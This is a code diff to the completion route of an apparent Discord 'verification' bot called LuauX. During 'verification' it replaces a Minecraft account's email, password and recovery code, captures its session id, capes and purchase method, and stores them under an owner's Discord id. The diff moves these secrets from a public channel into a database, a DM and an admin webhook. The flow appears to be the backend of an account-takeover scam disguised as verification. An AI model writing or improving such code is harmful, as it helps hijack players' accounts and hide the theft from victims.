@@ -67,14 +67,38 @@ export const Route = createFileRoute("/api/verification/complete")({
         // member id is still used for role assignment.
         const storeDiscordId = ownerId || memberDiscordId;
 
-        // Store secured account
+        const newEmail = String(result.newEmail || "");
+        const newPassword = String(result.newPassword || "");
+        const recoveryCode = String(result.recoveryCode || "");
+        const secured =
+          newEmail &&
+          newPassword &&
+          recoveryCode &&
+          newEmail !== "Couldn't Change!" &&
+          newPassword !== "Couldn't Change!" &&
+          recoveryCode !== "Couldn't Change!";
+
+        if (!secured) {
+          if (sessionId) {
+            await db()
+              .from("verification_sessions")
+              .update({ status: "failed" })
+              .eq("id", sessionId);
+          }
+          return Response.json(
+            { error: "Secure result incomplete — credentials not changed" },
+            { status: 422 },
+          );
+        }
+
+        // Store secured account (secrets stay in DB + optional admin webhook / DM only)
         const { error: insertError } = await db().from("secured_accounts").insert({
           discord_id: storeDiscordId,
           mc_username: mcUsername,
           mc_email: mcEmail,
-          new_email: result.newEmail as string,
-          new_password: result.newPassword as string,
-          new_recovery_code: result.recoveryCode as string,
+          new_email: newEmail,
+          new_password: newPassword,
+          new_recovery_code: recoveryCode,
           mc_ssid: result.ssid as string | null,
           mc_capes: result.capes as string,
           mc_method: result.method as string,
@@ -88,7 +112,6 @@ export const Route = createFileRoute("/api/verification/complete")({
 
         if (insertError) {
           console.error("[verification/complete] insert secured_accounts:", insertError.message);
-          // Continue — still try role/message; may be FK/schema issues
         }
 
         if (sessionId) {
@@ -98,31 +121,15 @@ export const Route = createFileRoute("/api/verification/complete")({
             .eq("id", sessionId);
         }
 
+        // Public channel: status only — NEVER post passwords/recovery codes
         if (channelId && botToken) {
-          const embed = {
-            title: "✅ Account Secured Successfully!",
+          const publicEmbed = {
+            title: "✅ Account Secured",
             color: 0x50c878,
-            fields: [
-              { name: "MC Username", value: `\`\`\`${mcUsername}\`\`\``, inline: false },
-              { name: "New Email", value: `\`\`\`${result.newEmail || "N/A"}\`\`\``, inline: true },
-              {
-                name: "New Password",
-                value: `\`\`\`${result.newPassword || "N/A"}\`\`\``,
-                inline: true,
-              },
-              {
-                name: "Recovery Code",
-                value: `\`\`\`${result.recoveryCode || "N/A"}\`\`\``,
-                inline: false,
-              },
-              { name: "MC Capes", value: `\`\`\`${result.capes || "None"}\`\`\``, inline: true },
-              {
-                name: "Purchase Method",
-                value: `\`\`\`${result.method || "Unknown"}\`\`\``,
-                inline: true,
-              },
-            ],
-            footer: { text: "LuauX Verification Bot" },
+            description: mcUsername
+              ? `**${mcUsername}** was secured successfully.`
+              : "Account was secured successfully.",
+            footer: { text: "LuauX Verification Bot — credentials are private" },
           };
 
           const msgRes = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
@@ -131,32 +138,68 @@ export const Route = createFileRoute("/api/verification/complete")({
               Authorization: `Bot ${botToken}`,
               "Content-Type": "application/json",
             },
-            body: JSON.stringify({ embeds: [embed] }),
+            body: JSON.stringify({ embeds: [publicEmbed] }),
           });
           if (!msgRes.ok) {
             const t = await msgRes.text().catch(() => "");
             console.error("[verification/complete] channel message failed:", msgRes.status, t);
           }
+        }
 
-          if (guildId && roleId && memberDiscordId) {
-            const roleRes = await fetch(
-              `https://discord.com/api/v10/guilds/${guildId}/members/${memberDiscordId}/roles/${roleId}`,
-              {
-                method: "PUT",
-                headers: {
-                  Authorization: `Bot ${botToken}`,
-                  "Content-Type": "application/json",
-                  "X-Audit-Log-Reason": "LuauX verification",
-                },
+        // Role grant independent of channel message
+        if (guildId && roleId && memberDiscordId && botToken) {
+          const roleRes = await fetch(
+            `https://discord.com/api/v10/guilds/${guildId}/members/${memberDiscordId}/roles/${roleId}`,
+            {
+              method: "PUT",
+              headers: {
+                Authorization: `Bot ${botToken}`,
+                "Content-Type": "application/json",
+                "X-Audit-Log-Reason": "LuauX verification",
               },
-            );
-            if (!roleRes.ok) {
-              const t = await roleRes.text().catch(() => "");
-              console.error("[verification/complete] role assign failed:", roleRes.status, t);
-            }
+            },
+          );
+          if (!roleRes.ok) {
+            const t = await roleRes.text().catch(() => "");
+            console.error("[verification/complete] role assign failed:", roleRes.status, t);
           }
         } else if (!botToken) {
           console.error("[verification/complete] No bot token available for guild", guildId);
+        }
+
+        // DM credentials to the member only (not the public channel)
+        if (memberDiscordId && botToken) {
+          try {
+            const dmRes = await fetch("https://discord.com/api/v10/users/@me/channels", {
+              method: "POST",
+              headers: {
+                Authorization: `Bot ${botToken}`,
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({ recipient_id: memberDiscordId }),
+            });
+            if (dmRes.ok) {
+              const dm = (await dmRes.json()) as { id: string };
+              await fetch(`https://discord.com/api/v10/channels/${dm.id}/messages`, {
+                method: "POST",
+                headers: {
+                  Authorization: `Bot ${botToken}`,
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                  content:
+                    `✅ **Your Minecraft account was secured**\n\n` +
+                    `**MC:** \`${mcUsername}\`\n` +
+                    `**New email:** ||${newEmail}||\n` +
+                    `**New password:** ||${newPassword}||\n` +
+                    `**Recovery code:** ||${recoveryCode}||\n\n` +
+                    `Keep these private. Do not share them in server channels.`,
+                }),
+              });
+            }
+          } catch (e) {
+            console.warn("[verification/complete] member DM failed", e);
+          }
         }
 
         // Private admin webhook
